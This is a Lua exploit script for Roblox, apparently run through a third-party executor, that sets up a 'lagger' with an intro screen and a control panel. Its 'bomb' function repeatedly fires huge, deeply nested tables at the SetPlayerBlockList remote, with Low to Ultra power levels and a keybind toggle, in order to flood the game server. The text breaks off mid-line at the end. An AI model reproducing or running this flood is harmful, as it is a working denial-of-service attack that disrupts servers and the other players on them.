local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local CoreGui = game:GetService("CoreGui")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local player = Players.LocalPlayer
local ConfigFile = "EliteVSLaggerConfig.json"

-- ============================================================
-- INTRO (música + ELITE.VS.LAGGER en morado)
-- ============================================================
local function runIntro()
    local introGui = Instance.new("ScreenGui")
    introGui.Name = "EliteVSLagger_Intro"
    introGui.ResetOnSpawn = false
    introGui.IgnoreGuiInset = true
    introGui.DisplayOrder = 9999
    introGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    pcall(function()
        if syn and syn.protect_gui then syn.protect_gui(introGui) end
    end)
    if not pcall(function() introGui.Parent = CoreGui end) then
        introGui.Parent = player:WaitForChild("PlayerGui")
    end

    local bg = Instance.new("Frame", introGui)
    bg.Size = UDim2.new(1, 0, 1, 0)
    bg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    bg.BackgroundTransparency = 0
    bg.BorderSizePixel = 0

    -- Fondo con degradado morado sutil
    local gradBg = Instance.new("Frame", bg)
    gradBg.Size = UDim2.new(1, 0, 1, 0)
    gradBg.BackgroundColor3 = Color3.fromRGB(20, 0, 40)
    gradBg.BackgroundTransparency = 1
    gradBg.BorderSizePixel = 0
    local ug = Instance.new("UIGradient", gradBg)
    ug.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(10, 0, 20)),
        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(40, 0, 70)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(10, 0, 20))
    })
    ug.Rotation = 90
    TweenService:Create(gradBg, TweenInfo.new(2), {BackgroundTransparency = 0.3}):Play()

    -- Texto principal
    local title = Instance.new("TextLabel", bg)
    title.AnchorPoint = Vector2.new(0.5, 0.5)
    title.Position = UDim2.new(0.5, 0, 0.5, 0)
    title.Size = UDim2.new(0, 700, 0, 120)
    title.BackgroundTransparency = 1
    title.Text = "ELITE.VS.LAGGER"
    title.TextColor3 = Color3.fromRGB(180, 80, 255)
    title.Font = Enum.Font.GothamBlack
    title.TextSize = 60
    title.TextTransparency = 1
    title.TextStrokeColor3 = Color3.fromRGB(80, 0, 120)
    title.TextStrokeTransparency = 1
    title.ZIndex = 5

    local gradText = Instance.new("UIGradient", title)
    gradText.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(180, 80, 255)),
        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(230, 150, 255)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(140, 40, 220))
    })
    gradText.Rotation = 0

    -- Subtítulo
    local subtitle = Instance.new("TextLabel", bg)
    subtitle.AnchorPoint = Vector2.new(0.5, 0.5)
    subtitle.Position = UDim2.new(0.5, 0, 0.5, 70)
    subtitle.Size = UDim2.new(0, 500, 0, 30)
    subtitle.BackgroundTransparency = 1
    subtitle.Text = "LOADING..."
    subtitle.TextColor3 = Color3.fromRGB(180, 140, 220)
    subtitle.Font = Enum.Font.GothamBold
    subtitle.TextSize = 16
    subtitle.TextTransparency = 1
    subtitle.ZIndex = 5

    -- Línea decorativa
    local line = Instance.new("Frame", bg)
    line.AnchorPoint = Vector2.new(0.5, 0.5)
    line.Position = UDim2.new(0.5, 0, 0.5, 38)
    line.Size = UDim2.new(0, 0, 0, 2)
    line.BackgroundColor3 = Color3.fromRGB(200, 100, 255)
    line.BorderSizePixel = 0
    line.ZIndex = 5
    Instance.new("UICorner", line).CornerRadius = UDim.new(1, 0)

    -- Música
    local sound = nil
    pcall(function()
        local url = "https://files.catbox.moe/iyw1cb.mp3"
        local fileName = "EliteVSLagger_Intro.mp3"
        if writefile and (not isfile or not isfile(fileName)) then
            local data = game:HttpGet(url)
            if data then writefile(fileName, data) end
        end
        if getcustomasset and isfile and isfile(fileName) then
            sound = Instance.new("Sound")
            sound.SoundId = getcustomasset(fileName)
            sound.Volume = 1
            sound.Parent = game:GetService("SoundService")
            sound:Play()
        end
    end)

    -- Animación del título
    TweenService:Create(title, TweenInfo.new(0.8, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
        TextTransparency = 0,
        TextStrokeTransparency = 0.3
    }):Play()
    TweenService:Create(line, TweenInfo.new(0.9, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
        Size = UDim2.new(0, 400, 0, 2)
    }):Play()
    task.wait(0.3)
    TweenService:Create(subtitle, TweenInfo.new(0.6), {TextTransparency = 0}):Play()

    -- Efecto de pulso morado
    task.spawn(function()
        while introGui and introGui.Parent do
            TweenService:Create(gradText, TweenInfo.new(0.6), {Offset = Vector2.new(0.3, 0)}):Play()
            task.wait(0.6)
            TweenService:Create(gradText, TweenInfo.new(0.6), {Offset = Vector2.new(-0.3, 0)}):Play()
            task.wait(0.6)
        end
    end)

    -- Efecto de brillo del texto
    task.spawn(function()
        while introGui and introGui.Parent do
            TweenService:Create(title, TweenInfo.new(0.4), {TextColor3 = Color3.fromRGB(230, 150, 255)}):Play()
            task.wait(0.5)
            TweenService:Create(title, TweenInfo.new(0.4), {TextColor3 = Color3.fromRGB(180, 80, 255)}):Play()
            task.wait(0.5)
        end
    end)

    -- Duración de la intro (3.5 segundos) y luego fade out
    task.wait(3.5)
    if sound then
        pcall(function() sound:Stop() end)
        pcall(function() sound:Destroy() end)
    end
    TweenService:Create(bg, TweenInfo.new(0.5), {BackgroundTransparency = 1}):Play()
    TweenService:Create(title, TweenInfo.new(0.5), {TextTransparency = 1, TextStrokeTransparency = 1}):Play()
    TweenService:Create(subtitle, TweenInfo.new(0.5), {TextTransparency = 1}):Play()
    TweenService:Create(line, TweenInfo.new(0.5), {BackgroundTransparency = 1}):Play()
    task.wait(0.6)
    pcall(function() introGui:Destroy() end)
end

-- Ejecutar intro antes de cargar el UI
runIntro()

-- ============================================================
-- CONFIGURACIÓN DEL LAGGER
-- ============================================================
local NIVELES = {
    Low   = { poder = 25, texto = "SPEED RECOMMENDED 45-21" },
    Mid   = { poder = 32, texto = "SPEED RECOMMENDED 40-20" },
    High  = { poder = 35, texto = "SPEED RECOMMENDED 40-18" },
    Ultra = { poder = 70, texto = "ONLY TRYHARD" }
}

local COLORES = {
    Low   = Color3.fromRGB(180, 80, 255),
    Mid   = Color3.fromRGB(200, 50, 255),
    High  = Color3.fromRGB(220, 30, 255),
    Ultra = Color3.fromRGB(160, 0, 220)
}

local keybind = Enum.KeyCode.M
local listeningForInput = false
local laggerActive = false
local lagThread = nil
local nivelActual = "Low"
local nivelAnterior = "Low"
local ventanaBloqueada = false
local esperandoConfirmacion = false

local UI_CONFIG = {
    MainBg        = Color3.fromRGB(10, 0, 20),
    TitleColor    = Color3.fromRGB(180, 100, 255),
    TextColor     = Color3.fromRGB(220, 200, 255),
    ButtonInact   = Color3.fromRGB(20, 0, 35),
    ButtonLow     = Color3.fromRGB(180, 80, 255),
    ButtonMid     = Color3.fromRGB(200, 50, 255),
    ButtonHigh    = Color3.fromRGB(220, 30, 255),
    ButtonUltra   = Color3.fromRGB(160, 0, 220),
    ToggleOff     = Color3.fromRGB(20, 0, 35),
    ToggleOn      = Color3.fromRGB(40, 0, 60),
    LockColor     = Color3.fromRGB(220, 200, 255),
    UnlockColor   = Color3.fromRGB(150, 120, 180),
    Font          = Enum.Font.GothamBlack,
    BorderColor   = Color3.fromRGB(80, 0, 120),
    GlowColor     = Color3.fromRGB(200, 0, 255),
    SelectorBg    = Color3.fromRGB(60, 20, 90),
    SelectorAct   = Color3.fromRGB(0, 200, 100),
}

local function SaveConfig()
    local data = {
        Keybind = keybind.Name,
        Nivel = nivelActual,
        Bloqueado = ventanaBloqueada
    }
    pcall(function() writefile(ConfigFile, HttpService:JSONEncode(data)) end)
end

local function LoadConfig()
    if pcall(isfile, ConfigFile) and isfile(ConfigFile) then
        pcall(function()
            local data = HttpService:JSONDecode(readfile(ConfigFile))
            keybind = Enum.KeyCode[data.Keybind] or Enum.KeyCode.M
            nivelActual = data.Nivel or "Low"
            nivelAnterior = nivelActual
            ventanaBloqueada = data.Bloqueado or false
        end)
    end
end
LoadConfig()

local function bomb(poder)
    local main, spam = {}, {{}}
    local z = spam[1]
    for i = 1, 25 do
        local t = {}
        table.insert(z, t)
        z = t
    end
    local max = math.min(12000, poder * 50)
    for i = 1, max do
        table.insert(main, spam)
    end
    pcall(function()
        game:GetService("RobloxReplicatedStorage").SetPlayerBlockList:FireServer(main)
    end)
end

local function restartLagWithPower(poder)
    if laggerActive then
        if lagThread then task.cancel(lagThread) lagThread = nil end
        lagThread = task.spawn(function()
            while laggerActive do
                pcall(function()
                    game:GetService("NetworkClient"):SetOutgoingKBPSLimit(80000)
                end)
                bomb(poder)
                task.wait(0.18)
            end
        end)
    end
end

local toggleButton, btnLow, btnMid, btnHigh, btnUltra, lockButton
local titleLabel, textLagger, keybindButton
local infoLabel, lockIndicator
local confirmFrame, confirmText, confirmYes, confirmNo
local mainFrame

local function actualizarBotonesNivel()
    local function setBtn(btn, nivelKey)
        if nivelActual == nivelKey then
            btn.BackgroundColor3 = COLORES[nivelKey]
            btn.TextColor3 = Color3.fromRGB(0, 0, 0)
            btn.BorderSizePixel = 0
        else
            btn.BackgroundColor3 = UI_CONFIG.ButtonInact
            btn.TextColor3 = Color3.fromRGB(200, 200, 220)
            btn.BorderSizePixel = 1
            btn.BorderColor3 = UI_CONFIG.BorderColor
        end
    end
    setBtn(btnLow, "Low")
    setBtn(btnMid, "Mid")
    setBtn(btnHigh, "High")
    if nivelActual == "Ultra" then
        btnUltra.BackgroundColor3 = COLORES.Ultra
        btnUltra.TextColor3 = Color3.fromRGB(255, 255, 255)
        btnUltra.BorderSizePixel = 0
    else
        btnUltra.BackgroundColor3 = UI_CONFIG.ButtonInact
        btnUltra.TextColor3 = Color3.fromRGB(200, 200, 220)
        btnUltra.BorderSizePixel = 1
        btnUltra.BorderColor3 = UI_CONFIG.BorderColor
    end
    if infoLabel then
        infoLabel.Text = NIVELES[nivelActual].texto
        infoLabel.TextColor3 = COLORES[nivelActual]
    end
    if laggerActive then
        restartLagWithPower(NIVELES[nivelActual].poder)
    end
end

local function actualizarSwitch()
    if toggleButton then
        if laggerActive then
            toggleButton.Text = "ON"
            toggleButton.TextColor3 = Color3.fromRGB(180, 100, 255)
            toggleButton.BackgroundColor3 = UI_CONFIG.ToggleOn
        else
            toggleButton.Text = "OFF"
            toggleButton.TextColor3 = Color3.fromRGB(192, 192, 192)
            toggleButton.BackgroundColor3 = UI_CONFIG.ToggleOff
        end
    end
end

local function toggleLagger()
    laggerActive = not laggerActive
    actualizarSwitch()
    if laggerActive then
        if lagThread then task.cancel(lagThread) lagThread = nil end
        lagThread = task.spawn(function()
            while laggerActive do
                pcall(function()
                    game:GetService("NetworkClient"):SetOutgoingKBPSLimit(80000)
                end)
                bomb(NIVELES[nivelActual].poder)
                task.wait(0.18)
            end
        end)
    else
        if lagThread then task.cancel(lagThread) lagThread = nil end
    end
    SaveConfig()
end

local function actualizarCandado()
    if lockIndicator then
        if ventanaBloqueada then
            lockIndicator.Text = "LOCK"
            lockIndicator.TextColor3 = Color3.fromRGB(255, 80, 80)
        else
            lockIndicator.Text = "UNLOCK"
            lockIndicator.TextColor3 = Color3.fromRGB(80, 255, 80)
        end
    end
    if mainFrame then mainFrame.Draggable = not ventanaBloqueada end
end

local function actualizarKeybindButton()
    if keybindButton then
        local display = keybind.Name
        if display:match("Button") then display = display:gsub("Button", "") end
        keybindButton.Text = "[" .. display .. "]"
    end
end

local function mostrarConfirmacion()
    if esperandoConfirmacion then return end
    esperandoConfirmacion = true
    confirmFrame.Visible = true
    confirmFrame.BackgroundTransparency = 0.05
    TweenService:Create(confirmFrame, TweenInfo.new(0.3, Enum.EasingStyle.Quad), { BackgroundTransparency = 0.05 }):Play()
end

local function ocultarConfirmacion()
    esperandoConfirmacion = false
    confirmFrame.Visible = false
end

local function activarUltra()
    nivelAnterior = nivelActual
    nivelActual = "Ultra"
    actualizarBotonesNivel()
    SaveConfig()
    if not laggerActive then
        laggerActive = true
        actualizarSwitch()
        if lagThread then task.cancel(lagThread) end
        lagThread = task.spawn(function()
            while laggerActive do
                pcall(function()
                    game:GetService("NetworkClient"):SetOutgoingKBPSLimit(80000)
                end)
                bomb(NIVELES[nivelActual].poder)
                task.wait(0.18)
            end
        end)
    else
        restartLagWithPower(NIVELES[nivelActual].poder)
    end
    ocultarConfirmacion()
end

local function cancelarUltra()
    nivelActual = nivelAnterior
    actualizarBotonesNivel()
    SaveConfig()
    ocultarConfirmacion()
end

if CoreGui:FindFirstChild("EliteVSLagger_UI") then
    CoreGui.EliteVSLagger_UI:Destroy()
end

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "EliteVSLagger_UI"
screenGui.Parent = CoreGui
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.ResetOnSpawn = false

local function createDiscordText()
    local character = player.Character
    if not character then player.CharacterAdded:Wait() character = player.Character end
    local head = character:FindFirstChild("Head") or character:FindFirstChild("UpperTorso")
    if not head then return end
    local billboard = Instance.new("BillboardGui")
    billboard.Name = "DiscordText"
    billboard.Parent = head
    billboard.Adornee = head
    billboard.Size = UDim2.new(0, 350, 0, 40)
    billboard.StudsOffset = Vector3.new(0, 4.5, 0)
    billboard.MaxDistance = 200
    billboard.AlwaysOnTop = true
    local text = Instance.new("TextLabel")
    text.Parent = billboard
    text.BackgroundTransparency = 1
    text.Size = UDim2.new(1, 0, 1, 0)
    text.Font = Enum.Font.GothamBlack
    text.Text = "Elite_Hub"
    text.TextColor3 = Color3.fromRGB(200, 100, 255)
    text.TextSize = 22
    text.TextScaled = true
    text.TextXAlignment = Enum.TextXAlignment.Center
    text.TextYAlignment = Enum.TextYAlignment.Center
    text.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    text.TextStrokeTransparency = 0.2
end
createDiscordText()
player.CharacterAdded:Connect(function() task.wait(0.5) createDiscordText() end)

mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.Active = true
mainFrame.Draggable = true
mainFrame.BackgroundColor3 = UI_CONFIG.MainBg
mainFrame.BackgroundTransparency = 0
mainFrame.BorderSizePixel = 1
mainFrame.BorderColor3 = UI_CONFIG.BorderColor
mainFrame.Size = UDim2.new(0, 200, 0, 78)
mainFrame.Position = UDim2.new(0.15, 0, 0.5, -39)
mainFrame.Parent = screenGui
mainFrame.ClipsDescendants = true
Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 8)

local gradient = Instance.new("UIGradient", mainFrame)
gradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(20, 0, 40)),
    ColorSequenceKeypoint.new(0.3, Color3.fromRGB(40, 0, 70)),
    ColorSequenceKeypoint.new(0.6, Color3.fromRGB(70, 10, 110)),
    ColorSequenceKeypoint.new(0.85, Color3.fromRGB(110, 30, 160)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(160, 60, 220))
})
gradient.Rotation = 90

local imageBg = Instance.new("ImageLabel", mainFrame)
imageBg.BackgroundTransparency = 1
imageBg.Image = "rbxassetid://127310698083676"
imageBg.ImageTransparency = 0.25
imageBg.ImageColor3 = Color3.fromRGB(180, 100, 255)
imageBg.Size = UDim2.new(1, 0, 1, 0)
imageBg.Position = UDim2.new(0, 0, 0, 0)
imageBg.ZIndex = 1
imageBg.ClipsDescendants = true
Instance.new("UICorner", imageBg).CornerRadius = UDim.new(0, 8)

titleLabel = Instance.new("TextLabel", mainFrame)
titleLabel.BackgroundTransparency = 1
titleLabel.Position = UDim2.new(0, 2, 0, 0)
titleLabel.Size = UDim2.new(0, 90, 0, 20)
titleLabel.Font = Enum.Font.GothamBlack
titleLabel.Text = "ELITE.VS.Lagger"
titleLabel.TextColor3 = UI_CONFIG.TitleColor
titleLabel.TextSize = 16
titleLabel.TextXAlignment = Enum.TextXAlignment.Left
titleLabel.TextYAlignment = Enum.TextYAlignment.Center
titleLabel.ZIndex = 3
titleLabel.TextStrokeColor3 = Color3.fromRGB(40, 0, 60)
titleLabel.TextStrokeTransparency = 0.4

task.spawn(function()
    while true do
        TweenService:Create(titleLabel, TweenInfo.new(0.2, Enum.EasingStyle.Quad), { TextColor3 = Color3.fromRGB(140, 60, 200) }):Play()
        task.wait(0.25)
        TweenService:Create(titleLabel, TweenInfo.new(0.2, Enum.EasingStyle.Quad), { TextColor3 = UI_CONFIG.TitleColor }):Play()
        task.wait(0.35)
        TweenService:Create(titleLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad), { TextColor3 = Color3.fromRGB(120, 40, 180) }):Play()
        task.wait(0.1)
        TweenService:Create(titleLabel, TweenInfo.new(0.15, Enum.EasingStyle.Quad), { TextColor3 = UI_CONFIG.TitleColor }):Play()
        task.wait(0.4)
    end
end)

keybindButton = Instance.new("TextButton", mainFrame)
keybindButton.BackgroundColor3 = Color3.fromRGB(40, 10, 60)
keybindButton.BackgroundTransparency = 0.1
keybindButton.Position = UDim2.new(1, -55, 0, 1)
keybindButton.Size = UDim2.new(0, 28, 0, 10)
keybindButton.Font = Enum.Font.GothamBlack
keybindButton.Text = "[M]"
keybindButton.TextColor3 = Color3.fromRGB(220, 200, 255)
keybindButton.TextSize = 5
keybindButton.AutoButtonColor = false
keybindButton.ZIndex = 5
Instance.new("UICorner", keybindButton).CornerRadius = UDim.new(0, 4)
actualizarKeybindButton()

lockIndicator = Instance.new("TextLabel", mainFrame)
lockIndicator.BackgroundTransparency = 1
lockIndicator.Position = UDim2.new(1, -36, 0, 3)
lockIndicator.Size = UDim2.new(0, 40, 0, 14)
lockIndicator.Font = Enum.Font.GothamBlack
lockIndicator.Text = "UNLOCK"
lockIndicator.TextColor3 = Color3.fromRGB(80, 255, 80)
lockIndicator.TextSize = 5
lockIndicator.TextXAlignment = Enum.TextXAlignment.Center
lockIndicator.TextYAlignment = Enum.TextYAlignment.Top
lockIndicator.ZIndex = 6
actualizarCandado()

lockButton = Instance.new("TextButton", mainFrame)
lockButton.BackgroundTransparency = 1
lockButton.Position = UDim2.new(1, -37, 0, 1.5)
lockButton.Size = UDim2.new(0, 42, 0, 18)
lockButton.Font = Enum.Font.GothamBlack
lockButton.Text = ""
lockButton.AutoButtonColor = false
lockButton.ZIndex = 7
lockButton.MouseButton1Click:Connect(function()
    ventanaBloqueada = not ventanaBloqueada
    actualizarCandado()
    SaveConfig()
end)

textLagger = Instance.new("TextLabel", mainFrame)
textLagger.BackgroundTransparency = 1
textLagger.Position = UDim2.new(0, 5, 0, 22)
textLagger.Size = UDim2.new(0, 65, 0, 16)
textLagger.Font = Enum.Font.GothamBlack
textLagger.Text = "LAGGER"
textLagger.TextColor3 = Color3.fromRGB(220, 200, 255)
textLagger.TextSize = 10
textLagger.TextXAlignment = Enum.TextXAlignment.Left
textLagger.TextYAlignment = Enum.TextYAlignment.Center
textLagger.ZIndex = 5

toggleButton = Instance.new("TextButton", mainFrame)
toggleButton.BackgroundColor3 = UI_CONFIG.ToggleOff
toggleButton.BackgroundTransparency = 0
toggleButton.Position = UDim2.new(1, -52, 0, 22)
toggleButton.Size = UDim2.new(0, 44, 0, 16)
toggleButton.Font = Enum.Font.GothamBlack
toggleButton.Text = "OFF"
toggleButton.TextSize = 7
toggleButton.TextColor3 = Color3.fromRGB(192, 192, 192)
toggleButton.TextXAlignment = Enum.TextXAlignment.Center
toggleButton.TextYAlignment = Enum.TextYAlignment.Center
toggleButton.ZIndex = 5
toggleButton.AutoButtonColor = false
toggleButton.MouseButton1Click:Connect(toggleLagger)
Instance.new("UICorner", toggleButton).CornerRadius = UDim.new(1,0)

keybindButton.MouseButton1Click:Connect(function()
    if listeningForInput then return end
    listeningForInput = true
    keybindButton.Text = "[?]"
    keybindButton.BackgroundColor3 = Color3.fromRGB(200, 0, 255)
    keybindButton.TextColor3 = Color3.fromRGB(255,255,255)
end)

local inputConnection
inputConnection = UserInputService.InputBegan:Connect(function(input, gp)
    if not listeningForInput then return end
    if gp then return end
    local newKey = nil
    if input.KeyCode ~= Enum.KeyCode.Unknown then
        newKey = input.KeyCode
    elseif input.UserInputType == Enum.UserInputType.Gamepad1 and input.KeyCode ~= Enum.KeyCode.Unknown then
        newKey = input.KeyCode
    end
    if newKey then
        keybind = newKey
        actualizarKeybindButton()
        SaveConfig()
        listeningForInput = false
        keybindButton.BackgroundColor3 = Color3.fromRGB(40, 10, 60)
        keybindButton.BackgroundTransparency = 0.1
        keybindButton.TextColor3 = Color3.fromRGB(220, 200, 255)
    end
end)

local keybindConnection
keybindConnection = UserInputService.InputBegan:Connect(function(input, gp)
    if gp then return end
    if listeningForInput then return end
    if input.KeyCode == keybind then toggleLagger() end
end)

local btnY = 40
local btnW = 42
local btnH = 18
local espaciado = 3
local margenIzq = 2

btnLow = Instance.new("TextButton", mainFrame)
btnLow.Size = UDim2.new(0, btnW, 0, btnH)
btnLow.Position = UDim2.new(0, margenIzq, 0, btnY)
btnLow.Font = UI_CONFIG.Font
btnLow.Text = "LOW"
btnLow.TextColor3 = Color3.fromRGB(200, 200, 220)
btnLow.TextSize = 8
btnLow.AutoButtonColor = false
btnLow.BackgroundColor3 = UI_CONFIG.ButtonInact
btnLow.BorderSizePixel = 1
btnLow.BorderColor3 = UI_CONFIG.BorderColor
btnLow.ZIndex = 5
Instance.new("UICorner", btnLow).CornerRadius = UDim.new(0, 5)
btnLow.MouseButton1Click:Connect(function()
    nivelActual = "Low"
    actualizarBotonesNivel()
    SaveConfig()
end)

btnMid = Instance.new("TextButton", mainFrame)
btnMid.Size = UDim2.new(0, btnW, 0, btnH)
btnMid.Position = UDim2.new(0, margenIzq + btnW + espaciado, 0, btnY)
btnMid.Font = UI_CONFIG.Font
btnMid.Text = "MID"
btnMid.TextColor3 = Color3.fromRGB(200, 200, 220)
btnMid.TextSize = 8
btnMid.AutoButtonColor = false
btnMid.BackgroundColor3 = UI_CONFIG.ButtonInact
btnMid.BorderSizePixel = 1
btnMid.BorderColor3 = UI_CONFIG.BorderColor
btnMid.ZIndex = 5
Instance.new("UICorner", btnMid).CornerRadius = UDim.new(0, 5)
btnMid.MouseButton1Click:Connect(function()
    nivelActual = "Mid"
    actualizarBotonesNivel()
    SaveConfig()
end)

btnHigh = Instance.new("TextButton", mainFrame)
btnHigh.Size = UDim2.new(0, btnW, 0, btnH)
btnHigh.Position = UDim2.new(0, margenIzq + (btnW + espaciado) * 2, 0, btnY)
btnHigh.Font = UI_CONFIG.Font
btnHigh.Text = "HIGH"
btnHigh.TextColor3 = Color3.fromRGB(200, 200, 220)
btnHigh.TextSize = 8
btnHigh.AutoButtonColor = false
btnHigh.BackgroundColor3 = UI_CONFIG.ButtonInact
btnHigh.BorderSizePixel = 1
btnHigh.BorderColor3 = UI_CONFIG.BorderColor
btnHigh.ZIndex = 5
Instance.new("UICorner", btnHigh).CornerRadius = UDim.new(0, 5)
btnHigh.MouseButton1Click:Connect(function()
    nivelActual = "High"
    actualizarBotonesNivel()
    SaveConfig()
end)

btnUltra = Instance.new("TextButton", mainFrame)
btnUltra.Size = UDim2.new(0, btnW, 0, btnH)
btnUltra.Position = UDim2.new(0, margenIzq + (btnW + espaciado) * 3, 0, btnY)
btnUltra.Font = UI_CONFIG.Font
btnUltra.Text = "ULTRA"
btnUltra.TextColor3 = Color3.fromRGB(200, 200, 220)
btnUltra.TextSize = 7
btnUltra.AutoButtonColor = false
btnUltra.BackgroundColor3 = UI_CONFIG.ButtonInact
btnUltra.BorderSizePixel = 1
btnUltra.BorderColor3 = UI_CONFIG.BorderColor
btnUltra.ZIndex = 5
Instance.new("UICorner", btnUltra).CornerRadius = UDim.new(0, 5)
btnUltra.MouseButton1Click:Connect(function()
    if nivelActual == "Ultra" then return end
    nivelAnterior = nivelActual
    mostrarConfirmacion()
end)

infoLabel = Instance.new("TextLabel", mainFrame)
infoLabel.BackgroundTransparency = 1
infoLabel.Position = UDim2.new(0, 3, 0, 61)
infoLabel.Size = UDim2.new(1, -6, 0, 12)
infoLabel.Font = Enum.Font.GothamBlack
infoLabel.Text = NIVELES.Low.texto
infoLabel.TextColor3 = COLORES.Low
infoLabel.TextSize = 7
infoLabel.TextXAlignment = Enum.TextXAlignment.Left
infoLabel.TextYAlignment = Enum.TextYAlignment.Top
infoLabel.ZIndex = 5

confirmFrame = Instance.new("Frame", screenGui)
confirmFrame.BackgroundColor3 = Color3.fromRGB(10, 0, 20)
confirmFrame.BackgroundTransparency = 0.05
confirmFrame.BorderSizePixel = 2
confirmFrame.BorderColor3 = Color3.fromRGB(160, 0, 220)
confirmFrame.Size = UDim2.new(0, 320, 0, 140)
confirmFrame.Position = UDim2.new(0.5, -160, 0.5, -70)
confirmFrame.ZIndex = 10
confirmFrame.Visible = false
Instance.new("UICorner", confirmFrame).CornerRadius = UDim.new(0, 12)

local bgOverlay = Instance.new("Frame", confirmFrame)
bgOverlay.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
bgOverlay.BackgroundTransparency = 0.3
bgOverlay.Size = UDim2.new(1, 0, 1, 0)
bgOverlay.ZIndex = 0
Instance.new("UICorner", bgOverlay).CornerRadius = UDim.new(0, 12)

local confirmTitle = Instance.new("TextLabel", confirmFrame)
confirmTitle.BackgroundTransparency = 1
confirmTitle.Position = UDim2.new(0, 10, 0, 8)
confirmTitle.Size = UDim2.new(1, -20, 0, 20)
confirmTitle.Font = Enum.Font.GothamBlack
confirmTitle.Text = "⚠️ WARNING ⚠️"
confirmTitle.TextColor3 = Color3.fromRGB(255, 50, 50)
confirmTitle.TextSize = 16
confirmTitle.TextXAlignment = Enum.TextXAlignment.Center
confirmTitle.TextYAlignment = Enum.TextYAlignment.Center
confirmTitle.ZIndex = 11

confirmText = Instance.new("TextLabel", confirmFrame)
confirmText.BackgroundTransparency = 1
confirmText.Position = UDim2.new(0, 10, 0, 35)
confirmText.Size = UDim2.new(1, -20, 0, 55)
confirmText.Font = Enum.Font.Gotham
confirmText.Text = "ARE YOU SURE YOU WANT TO ACTIVATE THIS LAG MODE?\nTHIS MODE CAN CRASH YOUR GAME.\nONLY FOR HIGH-END DEVICES."
confirmText.TextColor3